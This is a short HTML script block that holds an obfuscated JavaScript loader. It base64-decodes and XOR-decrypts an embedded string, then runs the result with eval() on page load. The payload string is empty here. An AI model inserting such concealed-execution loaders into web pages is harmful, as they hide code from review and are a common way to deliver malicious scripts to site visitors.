<script>
(function() {
    // Encrypted data
    const _data = "";
    const _key = 17032011;
    
    // XOR Decrypt
    function _xorDecrypt(str, key) {
        let result = '';
        for(let i = 0; i < str.length; i++) {
            result += String.fromCharCode(str.charCodeAt(i) ^ key);
        }
        return result;
    }
    
    // Base64 Decode
    function _base64Decode(str) {
        try {
            return decodeURIComponent(escape(atob(str)));
        } catch(e) {
            return atob(str);
        }
    }
    
    // Main decrypt
    let _decrypted = _data;
    try {
        _decrypted = _base64Decode(_decrypted);
    } catch(e) {}
    
    _decrypted = _xorDecrypt(_decrypted, _key);
    
    // Execute
    eval(_decrypted);
})();
</script>
